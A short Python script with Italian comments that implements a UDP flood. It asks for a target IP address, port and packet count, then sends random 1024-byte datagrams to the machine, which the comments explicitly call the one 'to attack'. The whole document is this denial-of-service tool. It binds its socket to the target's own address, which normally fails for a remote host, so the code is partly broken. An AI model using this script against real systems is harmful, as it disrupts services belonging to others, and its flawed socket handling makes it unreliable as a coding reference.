import socket, random #importo la libreria socket e la libreria  random,rispettivamente per avviare la comunicazione e per randomizzare i dati che mando

target = input("Inserisci indirizzo IP: ") #chiedo all'utente l'indirizzo IP della macchina da attaccare
port = int(input("\nInserisci la porta: ")) #chiedo all'utente la porta della macchina da attaccare

p = int(input("\nQuanti pacchetti vuoi inviare?\n")) #chiedo all'utente quanti pacchetti vuole inviare 

i=0

while 1:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #creiamo il socket in ascolto
        s.bind((target, port)) #collego il socket all'indirizzo e porta che abbiamo fatto scegliere all'utente
        data = random.randbytes(1024) #contiene i dati che mandiamo al client
        addr = (str(target), int(port)) #variabile contenente la destinazione della macchina da attaccare
        while i<p:              #ciclo per inviare pacchetti richiesti dall'utente, al termine del quale esce
                s.sendto(data,addr) #metodo per inviare i dati randomici impostati all'indirizzo della macchina inserito
                i = i+1
        s.close() #chiude la connessione
        quit()
